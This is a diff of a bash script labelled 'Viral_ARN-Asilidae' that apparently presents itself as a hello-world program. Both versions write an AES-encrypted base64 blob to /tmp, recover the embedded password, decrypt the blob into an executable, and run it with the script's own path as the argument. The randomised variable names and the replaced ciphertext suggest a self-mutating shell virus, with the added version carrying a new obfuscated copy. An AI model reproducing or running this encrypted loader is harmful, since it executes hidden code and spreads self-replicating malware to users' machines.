@@ -1,42 +1,42 @@
 #!/bin/bash
 # Viral_ARN-Asilidae
-MynQcspMiOytu=$(realpath "$0")
-dmcKfubAhTdps=/tmp/virus.enc
-iQYFzOXitiakT=/tmp/mutation
+OvTyCtNEYWrOH=$(realpath "$0")
+xhdOMWjiQXvRZ=/tmp/virus.asi
+cAtpwHkYzuxLL=/tmp/mutation.asi
 echo -e "
-U2FsdGVkX18O+xVKNdB7qm+/fBCwZyAWgpXWRQMb91GEdxD1OcLhrebDMm40P5qm
-KIHWgBkb1UP7udge1UKXbwLbEYgPimBJMdtm39HvAql9g1OC5/07xPoyD2Exy7F1
-RbWlHHwoIIwse3TBQXTiTVLmoT3ZIFh9cB3CWXGXT+7RpuObo0sDh3wsxtoKvzIx
-CjKCpgboW2VJAlmpoM0/aWOJ9C70RWDzTMClpsVpvbpvPEEa+QWjSUFLqAu3J6Ah
-hLXjMtF2bWdGu+Sy25/Qg+GrDPWCv8ezN1d47FLYksROdgc7fwmXbDNFaJDCJCle
-euL2NYZvHGM5B9Gx1qwiM3ICU8Kwur35lXm+6iF/CAt2CcIWLnd8gw1b9up91Wyu
-uRl+xCM8Ofy3etXhmj2mJs8+IyFxuB0rTtZxfout8moRU+adJQMLM3BOR+Oc7iyO
-ObY1RdVRsS/7koFuiOCPUM7agvyk5q4srpyV2XTMpbAzGa1negETi+uDHpqLWOIb
-Ftjkd4Hxu9LHAr3WeI9/8ik+gJ32bqpMcT4Tuekt4uNp3GvrCHYHasiyCtQAeGK+
-5l49p6VndDG0N8j0TxFJ/5W5oCeZA8j8x27fMGBd6JQ9PtVHj7KKS+zh2JCdFGKl
-GQiaFPtmxzwqVyJhnLiGtcqPeBavK7YzdXTMWyGykji17qFU+OqTRwm9BcS1VkRr
-/K/fJJ4PJqpSjOeGu9cC8cc11VN/XGV9WDSbqP7sKoJtLCBX+SuFyCAT/4QD1Q+p
-dMCN8phxvhJ0SnorvEDdgrad8a4OChdWWDbaFEaC2la7Fj6LQgEIL3BXrzKf1GGF
-NsAEEPOr/DexDVkkPli8W5Fpe7+IKY65NbnCNCNfYGudFE9/5vFZ/cmBzErd09cP
-5D/cWeXg1sw4zei911ikdSvk4Pex+N9fn+P5tn1oboZ5LwykiHsxINbmf/2hsapL
-n+6ggCy9a34g1T4A9XwmbTdsk/f+OXeWmTWXrgm+Mf9RpRbKCT2CVyEbOBBhvamY
-hAXcuBqB77fDgF2ZuUt3pAn2F6p2/19OQpNyEKVtRqLW4CxhmTgz9m8ahFc/Sj1Y
-GBofuYzG0CeiBYxZwHr45WChXsbK3XCY8BMKM1u5hyFNNBsfonV/V8pHxmzndmrP
-8MdlEGSoA0apr3hy+Jm97SKjUWsPKBWFLVvSY468NIAyHqUdqjP768mDHQwO1aok
-thm3dvSjjktQ8CZCcqGrzjOjbcifUAqFlmlgmP4gPJ8iNv7VnOGZ4L5OzQx/Q90H
-jiJBpYy0VZFhYPi1d0SRRrl3aAAVmX1Zm+QKeeEy0wheojf7M/x1yfNat0/kurka
-eCzW83I0Qjw9zJooUratkKW9+MWsMSRJxmSm9VFx6m4pkc5SGwrARvyt75177vG6
-vfdgLY1l2BhHncUFSfqQtRNNh03nHCtTXMSKosC7Fb7z9JVbujZBSDi/2jL1EIx6
-DzPE7wpZ/pRbwIKUe4gI3UmEhmULkWSPZBQVRWWJ0SWj5TeJsVWTVvV0WstAnJZZ
-YEmYhEk8Gfodu5omSja3IOPPJ4J8AW3cZVhgWaeF8hvKGGxt9/oHnxeAxm5D70ob
-j6nK/HQLYC+Fp+hZOle7CeahaVgfWMXOdYmvylYgnUhBjJOzXvkmyyAudyMwOb9+
-9z7Qbw5CxLPuNn3nwdOiUE6KozDdSLj8lDa5c4+tRn9dcYBs6Jb1d/uHpnXYtVdL
-9CXnrbzozW9Zh5QqJ+dMpg==
-X1NQQ2F2LTkZW" > /tmp/virus.enc
-PASSWORD=$(tail -1 ${dmcKfubAhTdps})
-sed -i '$d' ${dmcKfubAhTdps}
-echo -n "$PASSWORD" | openssl aes-256-cbc -d -a -salt -pbkdf2 -in ${dmcKfubAhTdps} -out ${iQYFzOXitiakT} -pass stdin
-#rm ${dmcKfubAhTdps}
-chmod +x ${iQYFzOXitiakT}
-source "${iQYFzOXitiakT}" "${MynQcspMiOytu}"
-echo "Hola mundo"
+U2FsdGVkX18G2Fzav4G3ZvrKkskygPShvwoGTXwE5PCP+dxmIGOeiCZFbhrNAsnN
+ScMd4S/vj/RtpFkLHVkgV9D1AXG9Gh9PcZGzf6dajnb5uCmj9VHhq7eFFyLV9duV
+dkjZZ+kMWoIK5mnJqWdwxJeIvf6VR0wne95ihUpytIZCUvnXkvNRSMCM34/Qsl2U
+AbZOV2f1jQ6JIBv537CVtJilpP52rnzY77hUtUcQtm7uyvFCtS7GZDXkQDegA6Gt
+kR8VHjW6HYqGhWBnDgmUkGQDFYzIsRcgCH42eVY0Et3BBUu66o0qwXT86XeRai51
+Ba4nCKmAVEFkcSrDhh54KgVabW46+DolcvsnP5YUWkv/JqHpI8sGyEJDW3GaDKTq
+9Df0qQV/QRUxFB8is1NZmX6gCiHta+q7feNVI3AVD0qnN5eTrv595ImQjrB24QkY
+Rv9i6kIP8apPub3nuJKhhKFu/hj0AE/+ijZntGn1gmG+NrMWRunb6wrlbLMis5xy
+FwCOJoeprZ+c7wgMsEGVptKqFIpRzvplW8vuj5rY6zbhL1im7Q0H8k5o6C+drgxr
+BaV0rooM5cNy2iorNSPGJwYJNHW1tQzSQAablFCNuOsI7w6ykB9cl/A2bvM6BVQW
+V2tYfWbOVf1VqyejeBBl72aaef5bXbwhFkZ7UVwHc8ZYNh5icofWP7PH0Z8ZcjVA
++3MIdXFL60HhcPMoI56PgyD9e0stjAYQydNwT4VPzz3yQP5khmd+4BuNx473xo4X
+6CJjDIjCRJj/A7OggZKubCzhpjzATlUcZwYZgKYC8ySdO1f9LUfVcXaM9eO7o7wR
+tVPauoH312G1OAG9OciTS4YnaGkYfNFPfjK19nCwUa7+hHBw/x8v4koPIzzvlR9A
+vR0rnvnVdg+ckL7bqLT6PNLYdt8bX6sKzu7yP2lH7DPDtPW8f8T1F267fQvh0PLP
+7ZO1Ma1rqjfrnkLu0iIohETtIvJiB3Q2jd4f2alKQlSsDTuIsEtla/DQ5re0hfOa
+hOhxG7Uj4gMfxtRtMqxQROmZ2aWN5sQ85qITV41Fj3OgwLQsebh54dPLXUESlPXB
+OI/AE6cW2sM4JieSYmcut7pxhrP3uZrdEQrIp/7R4Mh67wo2vTfij2/eEAYLJowv
+a8z02enj7QzSVUP1/fiMLpmqwq4Xv6DpAL3hs1yiiLLyjcbGUoCWLjrVQBEUBiP9
+Sq8PwjLFNX9NxMGdGj9u9/5OFkfVzgCPtm45T47TYhHfjE3b/BlEim+0DruJ0oge
+/o7ql/bEYQL5cReo0O+CzIBidFdyloTuO5hy8stOmsUxFiDZPFZMqyJzlEGmG0PW
++YonqjgTwcsRgc4olEQRW+F71I9HPe+kuSrgpOeiu964Ffpmon//d+3QFAYnBHwb
+UjUopGUE3uzZ9Ce6JM6fFqFCoHvvQlarqDAy1LDdPSq/H+ExWzBRxfQBTXUYs5Jp
+0D9iDl8SF2/6EBTPZVlsEH7jym+AkFn3L037CB8liaLXfdtdTnQDJlEnrT87BupP
+e8Wek0aIADNrtk6NMZOU6myRHC6tpL1LaauCC2U1SnuMFQw2mUf1h/TaYqxS+ttc
+Nwv/1yNqRmmfSlWAnpmubhyRYfrP2QWtXFN9CtaUUVVY+4mzNbvGkTC01YcnnK6K
+1u5Dqq45wKcK7CALVy33/n/3O6fNKlEX+pS9gPNKAVpdYW7inwbigqkK8BELNYXE
+ZiMjlEggzIAIQ6SqojjyBA==
+Innb3v3pdhc42" > /tmp/virus.asi
+PASSWORD=$(tail -1 ${xhdOMWjiQXvRZ})
+sed -i '$d' ${xhdOMWjiQXvRZ}
+echo -n "$PASSWORD" | openssl aes-256-cbc -d -a -salt -pbkdf2 -in ${xhdOMWjiQXvRZ} -out ${cAtpwHkYzuxLL} -pass stdin
+chmod +x ${cAtpwHkYzuxLL}
+source "${cAtpwHkYzuxLL}" "${OvTyCtNEYWrOH}"
+rm -f /tmp/*.asi
+echo "Hello World!"
